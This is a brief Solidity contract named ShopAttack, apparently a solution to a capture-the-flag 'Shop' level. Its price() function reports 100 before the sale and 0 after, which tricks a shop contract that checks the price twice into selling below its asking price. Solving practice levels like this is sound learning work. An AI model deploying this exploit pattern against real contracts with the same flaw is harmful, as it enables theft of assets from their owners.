// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import {Shop} from "../levels/Shop.sol";

contract ShopAttack {
    function price() external view returns (uint256) {
        return Shop(msg.sender).isSold() ? 0 : 100;
    }

    function attack(address shop) external {
        Shop(shop).buy();
    }
}